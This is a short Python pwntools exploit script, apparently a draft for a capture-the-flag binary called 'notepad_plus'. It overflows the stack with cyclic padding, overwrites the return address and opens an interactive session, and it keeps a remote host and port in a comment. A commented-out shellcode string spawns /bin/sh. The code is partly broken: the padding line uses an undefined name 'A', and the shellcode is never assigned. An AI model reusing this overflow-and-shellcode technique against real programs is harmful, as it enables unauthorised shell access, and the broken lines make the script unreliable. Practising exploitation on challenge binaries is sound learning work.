from pwn import *

p = process("./notepad_plus")
# p = remote("140.115.59.7", 11004)

# print(p.recv())
raw_input("attach gdb")

# padding = cyclic(0xff+0xf)
padding = A * cyclic("saaataaauaaavaaawaaaxaaayaaazaab")

RIP = p64(0x4242424243434343) #CCCCBBBB
# RIP = p64(0x7fffffffdf70) # return At 0x7fffffffdfb8

# "\x48\x83\xC4\x10\xEB\x0A\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x6A\x42\x58\xFE\xC4\x48\x99\x52\xEB\x06\x90\x90\x90\x90\x90\x90\x49\x89\xD0\x49\x89\xD2\xEB\x08\x90\x90\x90\x90\x90\x90\x90\x90\x48\xBF\x2F\x62\x69\x6E\x2F\x2F\x73\x68\xEB\x04\x90\x90\x90\x90\x57\x54\x5E\x0F\x05"""
NOP = b"\x90" * 8
tail = b"\x90" * 3


p.sendline(padding + RIP)
# p.sendline(padding + shellcode + tail + RIP)
# p.sendline("12345nvwoijfwfowe")
p.interactive()